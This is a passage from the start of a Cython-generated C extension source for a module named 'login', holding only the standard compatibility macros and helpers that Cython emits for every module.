

/* BEGIN: Cython Metadata
{
    "distutils": {
        "name": "login",
        "sources": [
            "login.py"
        ]
    },
    "module_name": "login"
}
END: Cython Metadata */

#ifndef PY_SSIZE_T_CLEAN
#define PY_SSIZE_T_CLEAN
#endif 
#include "Python.h"
#ifndef Py_PYTHON_H
    #error Python headers needed to compile C extensions, please install development version of Python.
#elif PY_VERSION_HEX < 0x02060000 || (0x03000000 <= PY_VERSION_HEX && PY_VERSION_HEX < 0x03030000)
    #error Cython requires Python 2.6+ or Python 3.3+.
#else
#define CYTHON_ABI "0_29_28"
#define CYTHON_HEX_VERSION 0x001D1CF0
#define CYTHON_FUTURE_DIVISION 1
#include <stddef.h>
#ifndef offsetof
  #define offsetof(type, member) ( (size_t) & ((type*)0) -> member )
#endif
#if !defined(WIN32) && !defined(MS_WINDOWS)
  #ifndef __stdcall
    #define __stdcall
  #endif
  #ifndef __cdecl
    #define __cdecl
  #endif
  #ifndef __fastcall
    #define __fastcall
  #endif
#endif
#ifndef DL_IMPORT
  #define DL_IMPORT(t) t
#endif
#ifndef DL_EXPORT
  #define DL_EXPORT(t) t
#endif
#define __PYX_COMMA ,
#ifndef HAVE_LONG_LONG
  #if PY_VERSION_HEX >= 0x02070000
    #define HAVE_LONG_LONG
  #endif
#endif
#ifndef PY_LONG_LONG
  #define PY_LONG_LONG LONG_LONG
#endif
#ifndef Py_HUGE_VAL
  #define Py_HUGE_VAL HUGE_VAL
#endif
#ifdef PYPY_VERSION
  #define CYTHON_COMPILING_IN_PYPY 1
  #define CYTHON_COMPILING_IN_PYSTON 0
  #define CYTHON_COMPILING_IN_CPYTHON 0
  #undef CYTHON_USE_TYPE_SLOTS
  #define CYTHON_USE_TYPE_SLOTS 0
  #undef CYTHON_USE_PYTYPE_LOOKUP
  #define CYTHON_USE_PYTYPE_LOOKUP 0
  #if PY_VERSION_HEX < 0x03050000
    #undef CYTHON_USE_ASYNC_SLOTS
    #define CYTHON_USE_ASYNC_SLOTS 0
  #elif !defined(CYTHON_USE_ASYNC_SLOTS)
    #define CYTHON_USE_ASYNC_SLOTS 1
  #endif
  #undef CYTHON_USE_PYLIST_INTERNALS
  #define CYTHON_USE_PYLIST_INTERNALS 0
  #undef CYTHON_USE_UNICODE_INTERNALS
  #define CYTHON_USE_UNICODE_INTERNALS 0
  #undef CYTHON_USE_UNICODE_WRITER
  #define CYTHON_USE_UNICODE_WRITER 0
  #undef CYTHON_USE_PYLONG_INTERNALS
  #define CYTHON_USE_PYLONG_INTERNALS 0
  #undef CYTHON_AVOID_BORROWED_REFS
  #define CYTHON_AVOID_BORROWED_REFS 1
  #undef CYTHON_ASSUME_SAFE_MACROS
  #define CYTHON_ASSUME_SAFE_MACROS 0
  #undef CYTHON_UNPACK_METHODS
  #define CYTHON_UNPACK_METHODS 0
  #undef CYTHON_FAST_THREAD_STATE
  #define CYTHON_FAST_THREAD_STATE 0
  #undef CYTHON_FAST_PYCALL
  #define CYTHON_FAST_PYCALL 0
  #undef CYTHON_PEP489_MULTI_PHASE_INIT
  #define CYTHON_PEP489_MULTI_PHASE_INIT 0
  #undef CYTHON_USE_TP_FINALIZE
  #define CYTHON_USE_TP_FINALIZE 0
  #undef CYTHON_USE_DICT_VERSIONS
  #define CYTHON_USE_DICT_VERSIONS 0
  #undef CYTHON_USE_EXC_INFO_STACK
  #define CYTHON_USE_EXC_INFO_STACK 0
#elif defined(PYSTON_VERSION)
  #define CYTHON_COMPILING_IN_PYPY 0
  #define CYTHON_COMPILING_IN_PYSTON 1
  #define CYTHON_COMPILING_IN_CPYTHON 0
  #ifndef CYTHON_USE_TYPE_SLOTS
    #define CYTHON_USE_TYPE_SLOTS 1
  #endif
  #undef CYTHON_USE_PYTYPE_LOOKUP
  #define CYTHON_USE_PYTYPE_LOOKUP 0
  #undef CYTHON_USE_ASYNC_SLOTS
  #define CYTHON_USE_ASYNC_SLOTS 0
  #undef CYTHON_USE_PYLIST_INTERNALS
  #define CYTHON_USE_PYLIST_INTERNALS 0
  #ifndef CYTHON_USE_UNICODE_INTERNALS
    #define CYTHON_USE_UNICODE_INTERNALS 1
  #endif
  #undef CYTHON_USE_UNICODE_WRITER
  #define CYTHON_USE_UNICODE_WRITER 0
  #undef CYTHON_USE_PYLONG_INTERNALS
  #define CYTHON_USE_PYLONG_INTERNALS 0
  #ifndef CYTHON_AVOID_BORROWED_REFS
    #define CYTHON_AVOID_BORROWED_REFS 0
  #endif
  #ifndef CYTHON_ASSUME_SAFE_MACROS
    #define CYTHON_ASSUME_SAFE_MACROS 1
  #endif
  #ifndef CYTHON_UNPACK_METHODS
    #define CYTHON_UNPACK_METHODS 1
  #endif
  #undef CYTHON_FAST_THREAD_STATE
  #define CYTHON_FAST_THREAD_STATE 0
  #undef CYTHON_FAST_PYCALL
  #define CYTHON_FAST_PYCALL 0
  #undef CYTHON_PEP489_MULTI_PHASE_INIT
  #define CYTHON_PEP489_MULTI_PHASE_INIT 0
  #undef CYTHON_USE_TP_FINALIZE
  #define CYTHON_USE_TP_FINALIZE 0
  #undef CYTHON_USE_DICT_VERSIONS
  #define CYTHON_USE_DICT_VERSIONS 0
  #undef CYTHON_USE_EXC_INFO_STACK
  #define CYTHON_USE_EXC_INFO_STACK 0
#else
  #define CYTHON_COMPILING_IN_PYPY 0
  #define CYTHON_COMPILING_IN_PYSTON 0
  #define CYTHON_COMPILING_IN_CPYTHON 1
  #ifndef CYTHON_USE_TYPE_SLOTS
    #define CYTHON_USE_TYPE_SLOTS 1
  #endif
  #if PY_VERSION_HEX < 0x02070000
    #undef CYTHON_USE_PYTYPE_LOOKUP
    #define CYTHON_USE_PYTYPE_LOOKUP 0
  #elif !defined(CYTHON_USE_PYTYPE_LOOKUP)
    #define CYTHON_USE_PYTYPE_LOOKUP 1
  #endif
  #if PY_MAJOR_VERSION < 3
    #undef CYTHON_USE_ASYNC_SLOTS
    #define CYTHON_USE_ASYNC_SLOTS 0
  #elif !defined(CYTHON_USE_ASYNC_SLOTS)
    #define CYTHON_USE_ASYNC_SLOTS 1
  #endif
  #if PY_VERSION_HEX < 0x02070000
    #undef CYTHON_USE_PYLONG_INTERNALS
    #define CYTHON_USE_PYLONG_INTERNALS 0
  #elif !defined(CYTHON_USE_PYLONG_INTERNALS)
    #define CYTHON_USE_PYLONG_INTERNALS 1
  #endif
  #ifndef CYTHON_USE_PYLIST_INTERNALS
    #define CYTHON_USE_PYLIST_INTERNALS 1
  #endif
  #ifndef CYTHON_USE_UNICODE_INTERNALS
    #define CYTHON_USE_UNICODE_INTERNALS 1
  #endif
  #if PY_VERSION_HEX < 0x030300F0 || PY_VERSION_HEX >= 0x030B00A2
    #undef CYTHON_USE_UNICODE_WRITER
    #define CYTHON_USE_UNICODE_WRITER 0
  #elif !defined(CYTHON_USE_UNICODE_WRITER)
    #define CYTHON_USE_UNICODE_WRITER 1
  #endif
  #ifndef CYTHON_AVOID_BORROWED_REFS
    #define CYTHON_AVOID_BORROWED_REFS 0
  #endif
  #ifndef CYTHON_ASSUME_SAFE_MACROS
    #define CYTHON_ASSUME_SAFE_MACROS 1
  #endif
  #ifndef CYTHON_UNPACK_METHODS
    #define CYTHON_UNPACK_METHODS 1
  #endif
  #if PY_VERSION_HEX >= 0x030B00A4
    #undef CYTHON_FAST_THREAD_STATE
    #define CYTHON_FAST_THREAD_STATE 0
  #elif !defined(CYTHON_FAST_THREAD_STATE)
    #define CYTHON_FAST_THREAD_STATE 1
  #endif
  #ifndef CYTHON_FAST_PYCALL
    #define CYTHON_FAST_PYCALL (PY_VERSION_HEX < 0x030B00A1)
  #endif
  #ifndef CYTHON_PEP489_MULTI_PHASE_INIT
    #define CYTHON_PEP489_MULTI_PHASE_INIT (PY_VERSION_HEX >= 0x03050000)
  #endif
  #ifndef CYTHON_USE_TP_FINALIZE
    #define CYTHON_USE_TP_FINALIZE (PY_VERSION_HEX >= 0x030400a1)
  #endif
  #ifndef CYTHON_USE_DICT_VERSIONS
    #define CYTHON_USE_DICT_VERSIONS (PY_VERSION_HEX >= 0x030600B1)
  #endif
  #if PY_VERSION_HEX >= 0x030B00A4
    #undef CYTHON_USE_EXC_INFO_STACK
    #define CYTHON_USE_EXC_INFO_STACK 0
  #elif !defined(CYTHON_USE_EXC_INFO_STACK)
    #define CYTHON_USE_EXC_INFO_STACK (PY_VERSION_HEX >= 0x030700A3)
  #endif
#endif
#if !defined(CYTHON_FAST_PYCCALL)
#define CYTHON_FAST_PYCCALL  (CYTHON_FAST_PYCALL && PY_VERSION_HEX >= 0x030600B1)
#endif
#if CYTHON_USE_PYLONG_INTERNALS
  #if PY_MAJOR_VERSION < 3
    #include "longintrepr.h"
  #endif
  #undef SHIFT
  #undef BASE
  #undef MASK
  #ifdef SIZEOF_VOID_P
    enum { __pyx_check_sizeof_voidp = 1 / (int)(SIZEOF_VOID_P == sizeof(void*)) };
  #endif
#endif
#ifndef __has_attribute
  #define __has_attribute(x) 0
#endif
#ifndef __has_cpp_attribute
  #define __has_cpp_attribute(x) 0
#endif
#ifndef CYTHON_RESTRICT
  #if defined(__GNUC__)
    #define CYTHON_RESTRICT __restrict__
  #elif defined(_MSC_VER) && _MSC_VER >= 1400
    #define CYTHON_RESTRICT __restrict
  #elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L
    #define CYTHON_RESTRICT restrict
  #else
    #define CYTHON_RESTRICT
  #endif
#endif
#ifndef CYTHON_UNUSED
# if defined(__GNUC__)
#   if !(defined(__cplusplus)) || (__GNUC__ > 3 || (__GNUC__ == 3 && __GNUC_MINOR__ >= 4))
#     define CYTHON_UNUSED __attribute__ ((__unused__))
#   else
#     define CYTHON_UNUSED
#   endif
# elif defined(__ICC) || (defined(__INTEL_COMPILER) && !defined(_MSC_VER))
#   define CYTHON_UNUSED __attribute__ ((__unused__))
# else
#   define CYTHON_UNUSED
# endif
#endif
#ifndef CYTHON_MAYBE_UNUSED_VAR
#  if defined(__cplusplus)
     template<class T> void CYTHON_MAYBE_UNUSED_VAR( const T& ) { }
#  else
#    define CYTHON_MAYBE_UNUSED_VAR(x) (void)(x)
#  endif
#endif
#ifndef CYTHON_NCP_UNUSED
# if CYTHON_COMPILING_IN_CPYTHON
#  define CYTHON_NCP_UNUSED
# else
#  define CYTHON_NCP_UNUSED CYTHON_UNUSED
# endif
#endif
#define __Pyx_void_to_None(void_result) ((void)(void_result), Py_INCREF(Py_None), Py_None)
#ifdef _MSC_VER
    #ifndef _MSC_STDINT_H_
        #if _MSC_VER < 1300
           typedef unsigned char     uint8_t;
           typedef unsigned int      uint32_t;
        #else
           typedef unsigned __int8   uint8_t;
           typedef unsigned __int32  uint32_t;
        #endif
    #endif
#else
   #include <stdint.h>
#endif
#ifndef CYTHON_FALLTHROUGH
  #if defined(__cplusplus) && __cplusplus >= 201103L
    #if __has_cpp_attribute(fallthrough)
      #define CYTHON_FALLTHROUGH [[fallthrough]]
    #elif __has_cpp_attribute(clang::fallthrough)
      #define CYTHON_FALLTHROUGH [[clang::fallthrough]]
    #elif __has_cpp_attribute(gnu::fallthrough)
      #define CYTHON_FALLTHROUGH [[gnu::fallthrough]]
    #endif
  #endif
  #ifndef CYTHON_FALLTHROUGH
    #if __has_attribute(fallthrough)
      #define CYTHON_FALLTHROUGH __attribute__((fallthrough))
    #else
      #define CYTHON_FALLTHROUGH
    #endif
  #endif
  #if defined(__clang__ ) && defined(__apple_build_version__)
    #if __apple_build_version__ < 7000000
      #undef  CYTHON_FALLTHROUGH
      #define CYTHON_FALLTHROUGH
    #endif
  #endif
#endif

#ifndef CYTHON_INLINE
  #if defined(__clang__)
    #define CYTHON_INLINE __inline__ __attribute__ ((__unused__))
  #elif defined(__GNUC__)
    #define CYTHON_INLINE __inline__
  #elif defined(_MSC_VER)
    #define CYTHON_INLINE __inline
  #elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L
    #define CYTHON_INLINE inline
  #else
    #define CYTHON_INLINE
  #endif
#endif

#if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX < 0x02070600 && !defined(Py_OptimizeFlag)
  #define Py_OptimizeFlag 0
#endif
#define __PYX_BUILD_PY_SSIZE_T "n"
#define CYTHON_FORMAT_SSIZE_T "z"
#if PY_MAJOR_VERSION < 3
  #define __Pyx_BUILTIN_MODULE_NAME "__builtin__"
  #define __Pyx_PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\
          PyCode_New(a+k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)
  #define __Pyx_DefaultClassType PyClass_Type
#else
  #define __Pyx_BUILTIN_MODULE_NAME "builtins"
  #define __Pyx_DefaultClassType PyType_Type
#if PY_VERSION_HEX >= 0x030B00A1
    static CYTHON_INLINE PyCodeObject* __Pyx_PyCode_New(int a, int k, int l, int s, int f,
                                                    PyObject *code, PyObject *c, PyObject* n, PyObject *v,
                                                    PyObject *fv, PyObject *cell, PyObject* fn,
                                                    PyObject *name, int fline, PyObject *lnos) {
        PyObject *kwds=NULL, *argcount=NULL, *posonlyargcount=NULL, *kwonlyargcount=NULL;
        PyObject *nlocals=NULL, *stacksize=NULL, *flags=NULL, *replace=NULL, *call_result=NULL, *empty=NULL;
        const char *fn_cstr=NULL;
        const char *name_cstr=NULL;
        PyCodeObject* co=NULL;
        PyObject *type, *value, *traceback;
        PyErr_Fetch(&type, &value, &traceback);
        if (!(kwds=PyDict_New())) goto end;
        if (!(argcount=PyLong_FromLong(a))) goto end;
        if (PyDict_SetItemString(kwds, "co_argcount", argcount) != 0) goto end;
        if (!(posonlyargcount=PyLong_FromLong(0))) goto end;
        if (PyDict_SetItemString(kwds, "co_posonlyargcount", posonlyargcount) != 0) goto end;
        if (!(kwonlyargcount=PyLong_FromLong(k))) goto end;
        if (PyDict_SetItemString(kwds, "co_kwonlyargcount", kwonlyargcount) != 0) goto end;
        if (!(nlocals=PyLong_FromLong(l))) goto end;
        if (PyDict_SetItemString(kwds, "co_nlocals", nlocals) != 0) goto end;
        if (!(stacksize=PyLong_FromLong(s))) goto end;
        if (PyDict_SetItemString(kwds, "co_stacksize", stacksize) != 0) goto end;
        if (!(flags=PyLong_FromLong(f))) goto end;
        if (PyDict_SetItemString(kwds, "co_flags", flags) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_code", code) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_consts", c) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_names", n) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_varnames", v) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_freevars", fv) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_cellvars", cell) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_linetable", lnos) != 0) goto end;
        if (!(fn_cstr=PyUnicode_AsUTF8AndSize(fn, NULL))) goto end;
        if (!(name_cstr=PyUnicode_AsUTF8AndSize(name, NULL))) goto end;
        if (!(co = PyCode_NewEmpty(fn_cstr, name_cstr, fline))) goto end;
        if (!(replace = PyObject_GetAttrString((PyObject*)co, "replace"))) goto cleanup_code_too;
        if (!(empty = PyTuple_New(0))) goto cleanup_code_too; // unfortunately __pyx_empty_tuple isn't available here
        if (!(call_result = PyObject_Call(replace, empty, kwds))) goto cleanup_code_too;
        Py_XDECREF((PyObject*)co);
        co = (PyCodeObject*)call_result;
        call_result = NULL;
        if (0) {
            cleanup_code_too:
            Py_XDECREF((PyObject*)co);
            co = NULL;
        }
        end:
        Py_XDECREF(kwds);
        Py_XDECREF(argcount);
        Py_XDECREF(posonlyargcount);
        Py_XDECREF(kwonlyargcount);
        Py_XDECREF(nlocals);
        Py_XDECREF(stacksize);
        Py_XDECREF(replace);
        Py_XDECREF(call_result);
        Py_XDECREF(empty);
        if (type) {
            PyErr_Restore(type, value, traceback);
        }
        return co;
    }
#else
  #define __Pyx_PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\
          PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)
#endif
  #define __Pyx_DefaultClassType PyType_Type
#endif
#ifndef Py_TPFLAGS_CHECKTYPES
  #define Py_TPFLAGS_CHECKTYPES 0
#endif
#ifndef Py_TPFLAGS_HAVE_INDEX
  #define Py_TPFLAGS_HAVE_INDEX 0
#endif
#ifndef Py_TPFLAGS_HAVE_NEWBUFFER
  #define Py_TPFLAGS_HAVE_NEWBUFFER 0
#endif
#ifndef Py_TPFLAGS_HAVE_FINALIZE
  #define Py_TPFLAGS_HAVE_FINALIZE 0
#endif
#ifndef METH_STACKLESS
  #define METH_STACKLESS 0
#endif
#if PY_VERSION_HEX <= 0x030700A3 || !defined(METH_FASTCALL)
  #ifndef METH_FASTCALL
     #define METH_FASTCALL 0x80
  #endif
  typedef PyObject *(*__Pyx_PyCFunctionFast) (PyObject *self, PyObject *const *args, Py_ssize_t nargs);
  typedef PyObject *(*__Pyx_PyCFunctionFastWithKeywords) (PyObject *self, PyObject *const *args,
                                                          Py_ssize_t nargs, PyObject *kwnames);
#else
  #define __Pyx_PyCFunctionFast _PyCFunctionFast
  #define __Pyx_PyCFunctionFastWithKeywords _PyCFunctionFastWithKeywords
#endif
#if CYTHON_FAST_PYCCALL
#define __Pyx_PyFastCFunction_Check(func)\
    ((PyCFunction_Check(func) && (METH_FASTCALL == (PyCFunction_GET_FLAGS(func) & ~(METH_CLASS | METH_STATIC | METH_COEXIST | METH_KEYWORDS | METH_STACKLESS)))))
#else
#define __Pyx_PyFastCFunction_Check(func) 0
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyObject_Malloc)
  #define PyObject_Malloc(s)   PyMem_Malloc(s)
  #define PyObject_Free(p)     PyMem_Free(p)
  #define PyObject_Realloc(p)  PyMem_Realloc(p)
#endif
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX < 0x030400A1
  #define PyMem_RawMalloc(n)           PyMem_Malloc(n)
  #define PyMem_RawRealloc(p, n)       PyMem_Realloc(p, n)
  #define PyMem_RawFree(p)             PyMem_Free(p)
#endif
#if CYTHON_COMPILING_IN_PYSTON
  #define __Pyx_PyCode_HasFreeVars(co)  PyCode_HasFreeVars(co)
  #define __Pyx_PyFrame_SetLineNumber(frame, lineno) PyFrame_SetLineNumber(frame, lineno)
#else
  #define __Pyx_PyCode_HasFreeVars(co)  (PyCode_GetNumFree(co) > 0)
  #define __Pyx_PyFrame_SetLineNumber(frame, lineno)  (frame)->f_lineno = (lineno)
#endif
#if !CYTHON_FAST_THREAD_STATE || PY_VERSION_HEX < 0x02070000
  #define __Pyx_PyThreadState_Current PyThreadState_GET()
#elif PY_VERSION_HEX >= 0x03060000
  #define __Pyx_PyThreadState_Current _PyThreadState_UncheckedGet()
#elif PY_VERSION_HEX >= 0x03000000
  #define __Pyx_PyThreadState_Current PyThreadState_GET()
#else
  #define __Pyx_PyThreadState_Current _PyThreadState_Current
#endif
#if PY_VERSION_HEX < 0x030700A2 && !defined(PyThread_tss_create) && !defined(Py_tss_NEEDS_INIT)
#include "pythread.h"
#define Py_tss_NEEDS_INIT 0
typedef int Py_tss_t;
static CYTHON_INLINE int PyThread_tss_create(Py_tss_t *key) {
  *key = PyThread_create_key();
  return 0;
}
static CYTHON_INLINE Py_tss_t * PyThread_tss_alloc(void) {
  Py_tss_t *key = (Py_tss_t *)PyObject_Malloc(sizeof(Py_tss_t));
  *key = Py_tss_NEEDS_INIT;
  return key;
}
static CYTHON_INLINE void PyThread_tss_free(Py_tss_t *key) {
  PyObject_Free(key);
}
static CYTHON_INLINE int PyThread_tss_is_created(Py_tss_t *key) {
  return *key != Py_tss_NEEDS_INIT;
}
static CYTHON_INLINE void PyThread_tss_delete(Py_tss_t *key) {
  PyThread_delete_key(*key);
  *key = Py_tss_NEEDS_INIT;
}
static CYTHON_INLINE int PyThread_tss_set(Py_tss_t *key, void *value) {
  return PyThread_set_key_value(*key, value);
}
static CYTHON_INLINE void * PyThread_tss_get(Py_tss_t *key) {
  return PyThread_get_key_value(*key);
}
#endif
#if CYTHON_COMPILING_IN_CPYTHON || defined(_PyDict_NewPresized)
#define __Pyx_PyDict_NewPresized(n)  ((n <= 8) ? PyDict_New() : _PyDict_NewPresized(n))
#else
#define __Pyx_PyDict_NewPresized(n)  PyDict_New()
#endif
#if PY_MAJOR_VERSION >= 3 || CYTHON_FUTURE_DIVISION
  #define __Pyx_PyNumber_Divide(x,y)         PyNumber_TrueDivide(x,y)
  #define __Pyx_PyNumber_InPlaceDivide(x,y)  PyNumber_InPlaceTrueDivide(x,y)
#else
  #define __Pyx_PyNumber_Divide(x,y)         PyNumber_Divide(x,y)
  #define __Pyx_PyNumber_InPlaceDivide(x,y)  PyNumber_InPlaceDivide(x,y)
#endif
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030500A1 && CYTHON_USE_UNICODE_INTERNALS
#define __Pyx_PyDict_GetItemStr(dict, name)  _PyDict_GetItem_KnownHash(dict, name, ((PyASCIIObject *) name)->hash)
#else
#define __Pyx_PyDict_GetItemStr(dict, name)  PyDict_GetItem(dict, name)
#endif
#if PY_VERSION_HEX > 0x03030000 && defined(PyUnicode_KIND)
  #define CYTHON_PEP393_ENABLED 1
  #if defined(PyUnicode_IS_READY)
  #define __Pyx_PyUnicode_READY(op)       (likely(PyUnicode_IS_READY(op)) ?\
                                              0 : _PyUnicode_Ready((PyObject *)(op)))
  #else
  #define __Pyx_PyUnicode_READY(op)       (0)
  #endif
  #define __Pyx_PyUnicode_GET_LENGTH(u)   PyUnicode_GET_LENGTH(u)
  #define __Pyx_PyUnicode_READ_CHAR(u, i) PyUnicode_READ_CHAR(u, i)
  #define __Pyx_PyUnicode_MAX_CHAR_VALUE(u)   PyUnicode_MAX_CHAR_VALUE(u)
  #define __Pyx_PyUnicode_KIND(u)         PyUnicode_KIND(u)
  #define __Pyx_PyUnicode_DATA(u)         PyUnicode_DATA(u)
  #define __Pyx_PyUnicode_READ(k, d, i)   PyUnicode_READ(k, d, i)
  #define __Pyx_PyUnicode_WRITE(k, d, i, ch)  PyUnicode_WRITE(k, d, i, ch)
  #if defined(PyUnicode_IS_READY) && defined(PyUnicode_GET_SIZE)
  #if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x03090000
  #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != (likely(PyUnicode_IS_READY(u)) ? PyUnicode_GET_LENGTH(u) : ((PyCompactUnicodeObject *)(u))->wstr_length))
  #else
  #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != (likely(PyUnicode_IS_READY(u)) ? PyUnicode_GET_LENGTH(u) : PyUnicode_GET_SIZE(u)))
  #endif
  #else
  #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != PyUnicode_GET_LENGTH(u))
  #endif
#else
  #define CYTHON_PEP393_ENABLED 0
  #define PyUnicode_1BYTE_KIND  1
  #define PyUnicode_2BYTE_KIND  2
  #define PyUnicode_4BYTE_KIND  4
  #define __Pyx_PyUnicode_READY(op)       (0)
  #define __Pyx_PyUnicode_GET_LENGTH(u)   PyUnicode_GET_SIZE(u)
  #define __Pyx_PyUnicode_READ_CHAR(u, i) ((Py_UCS4)(PyUnicode_AS_UNICODE(u)[i]))
  #define __Pyx_PyUnicode_MAX_CHAR_VALUE(u)   ((sizeof(Py_UNICODE) == 2) ? 65535 : 1114111)
  #define __Pyx_PyUnicode_KIND(u)         (sizeof(Py_UNICODE))
  #define __Pyx_PyUnicode_DATA(u)         ((void*)PyUnicode_AS_UNICODE(u))
  #define __Pyx_PyUnicode_READ(k, d, i)   ((void)(k), (Py_UCS4)(((Py_UNICODE*)d)[i]))
  #define __Pyx_PyUnicode_WRITE(k, d, i, ch)  (((void)(k)), ((Py_UNICODE*)d)[i] = ch)
  #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != PyUnicode_GET_SIZE(u))
#endif
#if CYTHON_COMPILING_IN_PYPY
  #define __Pyx_PyUnicode_Concat(a, b)      PyNumber_Add(a, b)
  #define __Pyx_PyUnicode_ConcatSafe(a, b)  PyNumber_Add(a, b)
#else
  #define __Pyx_PyUnicode_Concat(a, b)      PyUnicode_Concat(a, b)
  #define __Pyx_PyUnicode_ConcatSafe(a, b)  ((unlikely((a) == Py_None) || unlikely((b) == Py_None)) ?\
      PyNumber_Add(a, b) : __Pyx_PyUnicode_Concat(a, b))
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyUnicode_Contains)
  #define PyUnicode_Contains(u, s)  PySequence_Contains(u, s)
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyByteArray_Check)
  #define PyByteArray_Check(obj)  PyObject_TypeCheck(obj, &PyByteArray_Type)
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyObject_Format)
  #define PyObject_Format(obj, fmt)  PyObject_CallMethod(obj, "__format__", "O", fmt)
#endif
#define __Pyx_PyString_FormatSafe(a, b)   ((unlikely((a) == Py_None || (PyString_Check(b) && !PyString_CheckExact(b)))) ? PyNumber_Remainder(a, b) : __Pyx_PyString_Format(a, b))
#define __Pyx_PyUnicode_FormatSafe(a, b)  ((unlikely((a) == Py_None || (PyUnicode_Check(b) && !PyUnicode_CheckExact(b)))) ? PyNumber_Remainder(a, b) : PyUnicode_Format(a, b))
#if PY_MAJOR_VERSION >= 3
  #define __Pyx_PyString_Format(a, b)  PyUnicode_Format(a, b)
#else
  #define __Pyx_PyString_Format(a, b)  PyString_Format(a, b)
#endif
#if PY_MAJOR_VERSION < 3 && !defined(PyObject_ASCII)
  #define PyObject_ASCII(o)            PyObject_Repr(o)
#endif
#if PY_MAJOR_VERSION >= 3
  #define PyBaseString_Type            PyUnicode_Type
  #define PyStringObject               PyUnicodeObject
  #define PyString_Type                PyUnicode_Type
  #define PyString_Check               PyUnicode_Check
  #define PyString_CheckExact          PyUnicode_CheckExact
#ifndef PyObject_Unicode
  #define PyObject_Unicode             PyObject_Str
#endif
#endif
#if PY_MAJOR_VERSION >= 3
  #define __Pyx_PyBaseString_Check(obj) PyUnicode_Check(obj)
  #define __Pyx_PyBaseString_CheckExact(obj) PyUnicode_CheckExact(obj)
#else
  #define __Pyx_PyBaseString_Check(obj) (PyString_Check(obj) || PyUnicode_Check(obj))
  #define __Pyx_PyBaseString_CheckExact(obj) (PyString_CheckExact(obj) || PyUnicode_CheckExact(obj))
#endif
#ifndef PySet_CheckExact
  #define PySet_CheckExact(obj)        (Py_TYPE(obj) == &PySet_Type)
#endif
#if PY_VERSION_HEX >= 0x030900A4
  #define __Pyx_SET_REFCNT(obj, refcnt) Py_SET_REFCNT(obj, refcnt)
  #define __Pyx_SET_SIZE(obj, size) Py_SET_SIZE(obj, size)
#else
  #define __Pyx_SET_REFCNT(obj, refcnt) Py_REFCNT(obj) = (refcnt)
  #define __Pyx_SET_SIZE(obj, size) Py_SIZE(obj) = (size)
#endif
#if CYTHON_ASSUME_SAFE_MACROS
  #define __Pyx_PySequence_SIZE(seq)  Py_SIZE(seq)
#else
  #define __Pyx_PySequence_SIZE(seq)  PySequence_Size(seq)
#endif
#if PY_MAJOR_VERSION >= 3
  #define PyIntObject                  PyLongObject
  #define PyInt_Type                   PyLong_Type
  #define PyInt_Check(op)              PyLong_Check(op)
  #define PyInt_CheckExact(op)         PyLong_CheckExact(op)
  #define PyInt_FromString             PyLong_FromString
  #define PyInt_FromUnicode            PyLong_FromUnicode
  #define PyInt_FromLong               PyLong_FromLong
  #define PyInt_FromSize_t             PyLong_FromSize_t
  #define PyInt_FromSsize_t            PyLong_FromSsize_t
  #define PyInt_AsLong                 PyLong_AsLong
  #define PyInt_AS_LONG                PyLong_AS_LONG
  #define PyInt_AsSsize_t              PyLong_AsSsize_t
  #define PyInt_AsUnsignedLongMask     PyLong_AsUnsignedLongMask
  #define PyInt_AsUnsignedLongLongMask PyLong_AsUnsignedLongLongMask
  #define PyNumber_Int                 PyNumber_Long
#endif
#if PY_MAJOR_VERSION >= 3
  #define PyBoolObject                 PyLongObject
#endif
#if PY_MAJOR_VERSION >= 3 && CYTHON_COMPILING_IN_PYPY
  #ifndef PyUnicode_InternFromString
    #define PyUnicode_InternFromString(s) PyUnicode_FromString(s)
  #endif
#endif
#if PY_VERSION_HEX < 0x030200A4
  typedef long Py_hash_t;
  #define __Pyx_PyInt_FromHash_t PyInt_FromLong
  #define __Pyx_PyInt_AsHash_t   __Pyx_PyIndex_AsHash_t
#else
  #define __Pyx_PyInt_FromHash_t PyInt_FromSsize_t
  #define __Pyx_PyInt_AsHash_t   __Pyx_PyIndex_AsSsize_t
#endif
#if PY_MAJOR_VERSION >= 3
  #define __Pyx_PyMethod_New(func, self, klass) ((self) ? ((void)(klass), PyMethod_New(func, self)) : __Pyx_NewRef(func))
#else
  #define __Pyx_PyMethod_New(func, self, klass) PyMethod_New(func, self, klass)
#endif
#if CYTHON_USE_ASYNC_SLOTS
  #if PY_VERSION_HEX >= 0x030500B1
    #define __Pyx_PyAsyncMethodsStruct PyAsyncMethods
    #define __Pyx_PyType_AsAsync(obj) (Py_TYPE(obj)->tp_as_async)
  #else
    #define __Pyx_PyType_AsAsync(obj) ((__Pyx_PyAsyncMethodsStruct*) (Py_TYPE(obj)->tp_reserved))
  #endif
#else
  #define __Pyx_PyType_AsAsync(obj) NULL
#endif
#ifndef __Pyx_PyAsyncMethodsStruct
    typedef struct {
        unaryfunc am_await;
        unaryfunc am_aiter;
        unaryfunc am_anext;
    } __Pyx_PyAsyncMethodsStruct;
#endif

#if defined(WIN32) || defined(MS_WINDOWS)
  #define _USE_MATH_DEFINES
#endif
#include <math.h>
#ifdef NAN
#define __PYX_NAN() ((float) NAN)
#else
